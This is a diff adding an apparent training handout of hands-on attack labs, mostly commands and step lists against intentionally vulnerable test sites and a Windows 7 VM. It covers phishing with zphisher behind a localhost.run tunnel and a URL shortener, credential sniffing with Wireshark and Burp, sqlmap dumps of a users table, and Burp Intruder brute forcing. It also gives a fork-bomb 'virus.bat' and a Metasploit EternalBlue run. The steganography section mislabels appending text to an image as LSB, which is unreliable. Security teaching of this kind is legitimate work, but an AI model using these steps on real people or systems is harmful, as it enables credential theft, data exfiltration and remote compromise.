@@ -1,0 +1,373 @@
+Advance Threat Persistence - with practical-- 
+---------------------------------------------------------
+target or testing websites are- 
+http://testphp.vulnweb.com/
+http://altoro.testfire.net/
+ 
+========================================================================================================
+1.
+
+Lab establishment -
+------------------------
+vm player - https://www.techspot.com/downloads/1969-vmware-player.html 
+---------------------------
+VM ware Player download link for win- 
+https://www.techspot.com/downloads/downloadnowfile/1969/?evp=a6e906ac6db02cb7df2f5b5788a68df3&file=2171
+------------------------------------------------------------------------------------------------------
+Kali preinstall compressed file link - 
+https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-vmware-amd64.7z
+
+
+
+=======================================================================================================
+2.
+
+
+Social engineering is the manipulation of people into divulging confidential information 
+-----------------------------------------------------------------------------------------
+
+Spear phishing is a targeted attack where an email, crafted to appear from a trusted source, persuades a specific individual to divulge sensitive information; for example, an email appearing to come from a company’s IT department asking for login credentials.
+
+-----------------------------------------------------
+
+
+Practical - 
+
+sudo apt-get update
+sudo apt-get upgrade
+
+--------------------
+
+{Tool - website -https://github.com/htr-tech/zphisher}
+{downloading link -} 
+
+git clone --depth=1 https://github.com/htr-tech/zphisher.git
+
+cd zphisher
+bash zphisher.sh
+or 
+./zphisher.sh
+02 
+03
+01
+n
+--------------
+{open new terminal - use blow cmd}
+@ ssh-keygen
+@ ssh -R 80:localhost:8080 localhost.run
+
+-----------------------------------
+{https://63b6aadf3cb91a.lhr.life}
+{{use website to shorten url- https://free-url-shortener.rb.gy/ }}
+
+======================================================================================================
+
+3.
+
+
+
+
+
+Sniffing: Intercepting data from network traffic, like capturing passwords
+Target website - http://testphp.vulnweb.com/login.php
+--------------------
+open website
+http://testphp.vulnweb.com/login.php
+----------------------------
+in terminal -
+wireshark 
+------------
+select ech0
+------------
+insert credential in website
+--------------------------
+stop packet capturing in wireshark
+------------------------------------
+search http 
+-----------------------------------
+right click over the capturing packet -->select    follow -->select    http stream
+------------------------
+copy all packet's text and save that in notepad -----> save with html extension
+------------------------------------------------
+watch credential are visible there 
+(in request or response- it depend which capture packet you select for analysis)
+
+
+======================================================================================================
+4. 
+
+
+
+Sql Injection -
+tool - sql map 
+Target wepsite - 
+http://testphp.vulnweb.com/
+------------------------------------------
+Practtical - 
+
+sudo apt install sqlmap
+sqlmap --help
+sqlmap -u  http://testphp.vulnweb.com/ --crawl 2 
+
+
+---------------------------------------------------
+
+sudo apt install sqlmap
+sqlmap -u  http://testphp.vulnweb.com/ --batch  --crawl 2
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" --Batch
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" --dbs  
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 sqlmap -u --batch --technique "U" 
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" --dbs  
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart 
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart --tables
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart -T users --columns
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart -T users -C uname --dump
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart -T users --dump
+
+=========================================================================================================
+=========================================================================================================
+
+5. 
+
+
+
+
+  MIMA 
+tool- burp suite 
+
+
+open cmd and type - 
+
+burpsuite 
+proxy
+intercept is off 
+-------------------
+open browser --> click over the right corner for settings
+--> add-ons and themes
+--> search there - foxyproxy basic or standard  
+--> add extension
+click on right corner on foxyproxy logo --> 
+options  --> 
+Proxies -->  click on add  --> fill -->
+title - om 
+{hostname-write here your server ip otherwise localhost ip}
+hostname - 127.0.0.1
+{type-service or protocol}
+Type - HTTP 
+{port-write service or protocol's port no.}
+port -8080 
+{userand pass as you wish}
+--> save
+-----------------------------
+note - always disable foxyproxy 
+
+------------------------------
+open -->
+http://testphp.vulnweb.com/login.php
+just insert credentials ->
+username -> test 
+password -> test
+don't press on login 
+-----------------------------
+then go to burp suite --> proxy --> do intercept is on 
+--------------------------------------
+then open foxy proxy --> select account om 
+-- rather then disable -- 
+(om account created in foxy proxy)
+
+---------------------------------------
+then in Firefox --> click on login --
+---------------------------------------
+
+then check on burpsuite ----->
+---  burpsuite keep your request --> 
+--------------------------------------
+credential clearly visible there 
+--> credential visible in proxy
+  
+--------------------------------------
+to be continue in next practical ---
+
+note =- always disable foxyproxy 
+
+
+===================================================================
+
+
+
+6.
+
+
+
+Brute force attack - 
+tool - burp suite & Hydra
+
+A brute force attack tries all possible combinations (e.g., a1b2c3 to z9y8x7), 
+
+while a dictionary attack tests common passwords from a list (e.g., password, 123456).
+--------------------------------------------------------------------------------------
+
+--> --> credential visible in proxy
+--> right click --> send to intruder 
+-> right side --> clear
+{condition snipher you must write correct username}
+--> select  password portion 
+and then each time on  right side --> add  
+ 
+like - {uid=§admin§&passw=§test§&btnSubmit=Login}
+-----------------------------------------------------
+--> left side on top --> payloads
+---> below --> payload option simple list 
+--> add random password assumed or guessed list
+
+-->on right --> start attack
+-->there is any difference comes in length that will be the password  
+
+
+
+
+
+
+
+====================================================================
+
+7. 
+
+
+
+
+Steganography 
+LSB - least significant bit
+============================
+go to the image folder
+choose image 
+right click in the folder
+open terminal - 
+syntax -
+-----------------------------------------------------------------------------
+echo " in between the cotes write down the message " >> "image_name.extension" 
+ [remove all special characters like ~!@#$%^&*_+=]       [o.jpg/png etc]                                            []
+press enter
+open  the image in Notepad 
+at the end _you can see your 
+message 
+
+
+======================================================================
+
+
+8. 
+
+
+
+
+
+Make a virus
+
+write down in notpad below syntex
+------------------------------------
+@echo off
+
+:loop
+
+start
+start
+start
+start
+
+goto loop 
+-----------------------------------
+save & name - in - virus.bat
+
+
+@echo off - Hides the command output in the terminal window.
+:loop - Defines a label named "loop."
+start - Opens a new Command Prompt window. This command is repeated four times, opening four new windows each time the loop runs.
+goto loop - Jumps back to the :loop label, creating an infinite loop.
+
+===================================================================================================
+
+
+9.    
+
+attacker machine - kali
+target machine - win 7 
+
+extract ip of target os
+
+---------
+open kali terminal type ---.
+
+msfconsole 
+nmap -sS (target macine ip)
+nmap -sS 192.168.172.136
+
+search smb auxillury
+search smb auxillary
+search smb
+nmap -sS 192.168.176.136
+sudo nmap -sS 192.168.176.136
+-h
+help
+sudo nmap -sV 192.168.176.136
+sudo nmap -Pn 192.168.176.136 -v
+search smb
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.176.136 -v
+show options
+info
+exploit
+search smb exploit -v
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.176.136 -v
+exploit -v
+
+,,,,,,,,,,,,,,,,,,....................................
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+===================================================================================================
+===================================================================================================
+
+Spoofing: Pretending to be someone or something else to deceive or gain unauthorized access.
+
+
+
+
+
+
